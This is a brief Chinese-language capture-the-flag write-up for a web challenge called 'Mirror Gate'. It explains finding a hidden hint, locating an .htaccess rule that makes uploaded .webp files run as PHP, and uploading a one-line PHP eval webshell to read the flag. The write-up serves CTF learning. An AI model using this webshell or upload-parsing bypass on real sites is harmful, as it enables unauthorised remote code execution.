# Mirror Gate

## 收集信息

访问网站，<kbd>F12</kbd> 查看前端源码发现

```html
<!-- flag is in flag.php -->
<!-- HINT: c29tZXRoaW5nX2lzX2luXy91cGxvYWRzLw== -->
```

base64 解码 HINT：`something_is_in_/uploads/`

随便上传一张图片，跳转到成功页面，源码中提示

```html
<!--dirsearch-->
```

## 解题流程

用 dirsearch 扫描 ip:端口/uploads 发现 `.htacccess` 文件，访问显示:"AddType application/x-httpd-php .webp"

这说明: 上传的 webp 文件会被解析成 php 文件

接下来上传 webp 一句话木马，利用解析漏洞让我们的 .webp 解析成 .php，从而绕过检查

shell.webp 内容：

```php
<?php @eval($_POST['cmd']); ?>
```

蚁剑连接 webshell 输入 cat /flag.php 得到 flag
